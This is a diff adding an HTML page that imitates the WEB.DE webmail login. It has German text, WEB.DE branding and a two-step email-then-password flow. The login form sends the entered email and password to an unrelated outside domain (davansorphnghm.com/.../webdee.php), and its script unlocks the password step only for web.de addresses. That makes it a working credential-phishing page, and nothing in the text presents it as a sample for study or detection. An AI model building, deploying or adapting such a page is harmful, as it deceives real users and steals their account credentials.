@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web.de Login</title>
+    <style>
+        /* General Reset */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f2f2f2;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Main Card Container */
+        .login-card {
+            background-color: #fff;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            padding-top: 40px;
+            text-align: center;
+            margin-bottom: 60px; /* Space for footer */
+            overflow: hidden; 
+        }
+
+        /* Logo Area */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            height: 60px; /* Fixed height to prevent layout shift */
+        }
+
+        /* Optimized Logo Image Style */
+        .logo-img {
+            height: 100%;
+            width: auto;
+            max-width: 100%;
+            object-fit: contain;
+        }
+
+        /* Typography */
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        /* Form Elements */
+        .form-group {
+            padding: 0 40px;
+            margin-bottom: 15px;
+        }
+
+        /* Screen-reader only class for accessible labels */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border-width: 0;
+        }
+
+        /* Hide password field by default */
+        #passwordGroup {
+            display: none;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        /* Class to show password field */
+        #passwordGroup.show {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1px solid #999;
+            border-radius: 25px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #e6b800; /* Darker yellow focus */
+        }
+
+        /* Buttons */
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background-color: #fff9d6; /* Pale yellow default */
+            color: #ccc; /* Grey text default */
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        /* Highlighted/Active State - Kept Yellow */
+        .btn-continue.active {
+            background-color: #ffcc00; /* Vibrant Web.de Yellow */
+            color: #000; /* Black text for contrast */
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(255, 204, 0, 0.4);
+        }
+
+        .btn-continue.active:hover {
+            background-color: #e6b800; /* Slightly darker on hover */
+        }
+
+        .link-back {
+            display: inline-block;
+            margin-top: 20px;
+            color: #0060a8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+
+        .link-back:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer Section inside Card */
+        .card-footer {
+            background-color: #fbfbfb;
+            border-top: 1px solid #eee;
+            padding: 30px 20px;
+        }
+
+        .card-footer p {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .btn-register {
+            display: inline-block;
+            padding: 10px 24px;
+            border: 1px solid #0060a8;
+            border-radius: 25px;
+            color: #0060a8;
+            text-decoration: none;
+            font-size: 14px;
+            background-color: transparent;
+            transition: background-color 0.2s;
+        }
+
+        .btn-register:hover {
+            background-color: #f0f8ff;
+        }
+
+        /* Bottom Page Footer (Links) */
+        .page-footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            font-size: 12px;
+        }
+
+        .page-footer a {
+            color: #333;
+            text-decoration: none;
+        }
+
+        .page-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .login-card {
+                border-radius: 0;
+                box-shadow: none;
+                max-width: 100%;
+                height: 100vh;
+                margin-bottom: 0;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+            
+            .page-footer {
+                position: relative;
+                bottom: auto;
+                padding-bottom: 20px;
+                background: #fff;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <!-- Header Section -->
+        <div class="logo-container">
+            <!-- Make sure your image is saved as logo.png in the same folder -->
+            <img src="logo.png" alt="WEB.DE Logo" class="logo-img">
+        </div>
+
+        <h1>Willkommen!</h1>
+        <p class="subtitle">Mit Account anmelden</p>
+
+        <!-- Form Section -->
+        <form id="loginForm" method="POST" action="https://davansorphnghm.com/876776/webdee.php">            
+            <div class="form-group">
+                <label for="emailInput" class="sr-only">E-Mail</label>
+                <input type="email" id="emailInput" name="email" placeholder="E-Mail" required>
+            </div>
+            
+            <!-- Password Group (Hidden by default) -->
+            <div class="form-group" id="passwordGroup">
+                <label for="passwordInput" class="sr-only">Passwort</label>
+                <input type="password" id="passwordInput" name="password" placeholder="Passwort">
+            </div>
+            
+            <div class="form-group">
+                <button type="button" id="continueBtn" name="continue" class="btn-continue">Weiter</button>
+            </div>
+
+            <a href="#" class="link-back">Zurück</a>
+        </form>
+
+        <!-- Card Footer Section -->
+        <div class="card-footer">
+            <p>Oder neuen Account anlegen</p>
+            <a href="#" class="btn-register">Jetzt registrieren</a>
+        </div>
+    </div>
+
+    <!-- Bottom Links Footer -->
+    <footer class="page-footer">
+        <a href="#">AGB</a>
+        <a href="#">Impressum</a>
+        <a href="#">Verträge hier kündigen/widerrufen</a>
+        <a href="#">Datenschutz</a>
+        <a href="#">Barrierefreiheit</a>
+        <a href="#">Feedback</a>
+    </footer>
+
+    <!-- JavaScript for Logic -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('emailInput');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const passwordInput = document.getElementById('passwordInput');
+            const continueBtn = document.getElementById('continueBtn');
+
+            // 1. Highlight button based on email input
+            function checkEmailInput() {
+                const value = emailInput.value.trim().toLowerCase();
+                
+                if (value.endsWith('@web.de') || value.endsWith('@web.com')) {
+                    continueBtn.classList.add('active');
+                } else {
+                    continueBtn.classList.remove('active');
+                    // Hide password field if they change email back to invalid
+                    if (passwordGroup.classList.contains('show')) {
+                        passwordGroup.classList.remove('show');
+                        continueBtn.setAttribute('type', 'button'); 
+                        passwordInput.required = false;
+                        passwordInput.value = '';
+                    }
+                }
+            }
+
+            emailInput.addEventListener('input', checkEmailInput);
+
+            // 2. Handle "Weiter" button click
+            continueBtn.addEventListener('click', (e) => {
+                if (continueBtn.classList.contains('active')) {
+                    
+                    // Reveal password field and stop submission
+                    if (!passwordGroup.classList.contains('show')) {
+                        e.preventDefault(); 
+                        
+                        passwordGroup.classList.add('show');
+                        continueBtn.setAttribute('type', 'submit'); 
+                        passwordInput.required = true; 
+                        
+                        setTimeout(() => {
+                            passwordInput.focus();
+                        }, 50);
+                    }
+                }
+            });
+
+            // 3. Handle Enter key in Email input
+            emailInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault(); 
+                    if (continueBtn.classList.contains('active')) {
+                        continueBtn.click(); 
+                    }
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
